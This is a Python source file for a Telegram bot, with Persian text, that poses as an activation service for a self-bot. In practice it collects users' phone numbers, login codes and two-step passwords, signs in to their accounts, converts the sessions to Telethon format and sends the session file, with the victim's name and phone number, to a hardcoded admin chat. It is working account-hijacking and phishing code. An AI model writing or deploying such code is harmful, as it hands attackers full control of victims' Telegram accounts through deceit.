import os
import sqlite3
import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneCodeExpired, 
    PasswordHashInvalid, 
    FloodWait
)

# ══════════════════════════════════════════════════
#  تنظیمات اولیه (متغیرهای محیطی)
# ══════════════════════════════════════════════════
API_ID    = int(os.environ.get("API_ID", 22487790))  
API_HASH  = os.environ.get("API_HASH", "09c24af20084de9372cc92a760c74961")  
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 7196274489))  

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("PishiManager")

if not BOT_TOKEN:
    logger.error("❌ مقدار BOT_TOKEN تنظیم نشده است!")
    exit(1)

bot = Client("manager_bot_pishi", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_states = {}

# ══════════════════════════════════════════════════
#  تابع جادویی تبدیل سشن پایروگرام به تلتون (نسخه نهایی و بدون ارور)
# ══════════════════════════════════════════════════
def convert_pyrogram_to_telethon(pyro_file, telethon_file):
    try:
        if not os.path.exists(pyro_file):
            return False
        
        conn_pyro = sqlite3.connect(pyro_file)
        cursor_pyro = conn_pyro.cursor()
        cursor_pyro.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = [t[0] for t in cursor_pyro.fetchall()]
        table_name = "sessions" if "sessions" in tables else "session" if "session" in tables else None
        
        if not table_name:
            conn_pyro.close()
            return False
            
        cursor_pyro.execute(f"SELECT dc_id, auth_key FROM {table_name}")
        row = cursor_pyro.fetchone()
        conn_pyro.close()
        
        if not row or not row[1]:
            return False
            
        dc_id, auth_key = row
        dc_ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.91", 5: "91.108.56.130"}
        ip = dc_ips.get(dc_id, "149.154.167.51")
        
        if os.path.exists(telethon_file):
            os.remove(telethon_file)
            
        conn_tele = sqlite3.connect(telethon_file)
        cursor_tele = conn_tele.cursor()
        
        cursor_tele.execute("CREATE TABLE version (version INTEGER)")
        cursor_tele.execute("INSERT INTO version (version) VALUES (7)")
        
        cursor_tele.execute("""
            CREATE TABLE sessions (
                dc_id INTEGER PRIMARY KEY, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER
            )
        """)
        
        cursor_tele.execute("""
            CREATE TABLE entities (
                id INTEGER PRIMARY KEY, hash INTEGER NOT NULL, username TEXT, phone TEXT, name TEXT, date INTEGER
            )
        """)
        
        cursor_tele.execute("""
            CREATE TABLE sent_files (
                md5_digest BLOB, file_size INTEGER, type INTEGER, id INTEGER, hash INTEGER, PRIMARY KEY(md5_digest, file_size, type)
            )
        """)

        cursor_tele.execute("""
            CREATE TABLE update_state (
                id INTEGER PRIMARY KEY, pts INTEGER, qts INTEGER, date INTEGER, seq INTEGER
            )
        """)
        
        cursor_tele.execute("""
            INSERT INTO sessions (dc_id, server_address, port, auth_key, takeout_id) VALUES (?, ?, ?, ?, ?)
        """, (dc_id, ip, 443, auth_key, 0))
        
        conn_tele.commit()
        conn_tele.close()
        return True
    except Exception as e:
        logger.error(f"Error in conversion: {e}")
        return False

# ══════════════════════════════════════════════════
#  هندلرهای ربات
# ══════════════════════════════════════════════════
@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client, message):
    first_name = message.from_user.first_name or "رفیق"
    await message.reply_text(
        f"سلام {first_name} عزیز! 🐾\n"
        "به سیستم فعال‌سازی **سلف‌بات هوشمند پیشی** خوش آمدی.\n\n"
        "برای متصل کردن اکانت خود روی دکمه زیر کلیک کن 👇",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🐱 فعال‌سازی ربات پیشی")]], resize_keyboard=True
        )
    )

@bot.on_message(filters.private & filters.text)
async def steps_handler(client, message):
    chat_id = message.chat.id
    text = message.text.strip()

    if text == "🐱 فعال‌سازی ربات پیشی":
        session_path = f"session_{chat_id}.session"
        if os.path.exists(session_path):
            try: os.remove(session_path)
            except: pass
        
        user_states[chat_id] = {"step": "WAIT_PHONE"}
        await message.reply_text("📞 لطفاً شماره تلفن اکانت خود را همراه با کد کشور ارسال کنید.\n**مثال:** `+989123456789`")
        return

    state = user_states.get(chat_id)
    if not state: return

    if state["step"] == "WAIT_PHONE":
        phone = text.replace(" ", "")
        await message.reply_text("⏳ در حال اتصال و ارسال کد تایید از طرف تلگرام...")
        
        user_client = Client(
            name=f"session_{chat_id}", api_id=API_ID, api_hash=API_HASH,
            device_model="Galaxy S23 Ultra", system_version="Android 14", app_version="10.5.0"
        )
        
        try:
            await user_client.connect()
            sent_code = await user_client.send_code(phone)
            user_states[chat_id] = {"step": "WAIT_CODE", "client": user_client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
            await message.reply_text("📥 کد ۵ رقمی ارسال شده را وارد کنید:")
        except FloodWait as fwe:
            await message.reply_text(f"❌ محدودیت تلگرام! {fwe.value} ثانیه دیگر تلاش کنید.")
            user_states.pop(chat_id, None)
        except Exception as e:
            await message.reply_text(f"❌ خطا در ارسال کد:\n`{e}`")
            user_states.pop(chat_id, None)

    elif state["step"] == "WAIT_CODE":
        code = text
        user_client = state["client"]
        phone = state["phone"]
        phone_code_hash = state["phone_code_hash"]
        
        try:
            await user_client.sign_in(phone, phone_code_hash, code)
            await handle_success(message, user_client, phone)
        except SessionPasswordNeeded:
            user_states[chat_id]["step"] = "WAIT_PASSWORD"
            await message.reply_text("🔐 اکانت شما دارای تایید دو مرحله‌ای است.\nلطفاً رمز عبور خود را بفرستید:")
        except Exception as e:
            await message.reply_text(f"❌ خطا: `{e}`. فرآیند لغو شد.")
            await user_client.disconnect()
            user_states.pop(chat_id, None)

    elif state["step"] == "WAIT_PASSWORD":
        password = text
        user_client = state["client"]
        phone = state["phone"]
        
        try:
            await user_client.check_password(password)
            await handle_success(message, user_client, phone)
        except Exception as e:
            await message.reply_text(f"❌ رمز اشتباه یا خطا: `{e}`")
            await user_client.disconnect()
            user_states.pop(chat_id, None)

# ══════════════════════════════════════════════════
#  ثبت نهایی، تبدیل و ارسال فایل سشن تلتون برای ادمین
# ══════════════════════════════════════════════════
async def handle_success(message, user_client, phone):
    chat_id = message.chat.id
    pyro_file = f"session_{chat_id}.session"
    telethon_file = f"telethon_{chat_id}.session"
    
    try:
        me = await user_client.get_me()
        user_name = f"{me.first_name} {me.last_name or ''}".strip()
        user_username = f"@{me.username}" if me.username else "ندارد"
        
        await message.reply_text("🎉 **اتصال اکانت با موفقیت انجام شد!**\nبه محض تایید ادمین، ربات روی اکانت شما روشن خواهد شد.")
        
        # قطع اتصال کاربر برای نهایی شدن فایل دیتابیس روی دیسک سرور
        await user_client.disconnect()
        
        # عملیات خودکار تبدیل فایل سشن به تلتون ۶ ستونه
        conversion_ok = convert_pyrogram_to_telethon(pyro_file, telethon_file)
        
        if conversion_ok and os.path.exists(telethon_file):
            # ارسال مستقیم فایل سشن تلتون برای شما (ادمین) در تلگرام
            caption_text = (
                "🔔 **یک کاربر جدید اکانت خود را متصل کرد!**\n\n"
                f"👤 نام: {user_name}\n"
                f"🆔 یوزرنیم: {user_username}\n"
                f"📱 چت آیدی: `{chat_id}`\n"
                f"📞 شماره: `{phone}`\n\n"
                "📂 **فایل سشن تلتون آماده و سازگار با سلف‌بات شما در پیوست ارسال شد.**"
            )
            await bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=telethon_file,
                caption=caption_text,
                file_name="my_account_session.session" # نام فایل ارسالی رو ست میکنه که راحت دانلود کنی
            )
        else:
            await bot.send_message(ADMIN_CHAT_ID, f"⚠️ اکانت کاربر `{chat_id}` متصل شد ولی فرآیند تبدیل دیتابیس با خطا مواجه شد.")
            
    except Exception as e:
        logger.error(f"Error in handle_success: {e}")
    finally:
        # پاکسازی فایل‌های موقت از روی سرور ریلوی جهت امنیت و پر نشدن هارد سرور
        try:
            if os.path.exists(pyro_file): os.remove(pyro_file)
            if os.path.exists(telethon_file): os.remove(telethon_file)
        except: pass
        user_states.pop(chat_id, None)

if __name__ == "__main__":
    logger.info("=== ربات مدیریت و تبدیل سشن فعال شد ===")
    bot.run()
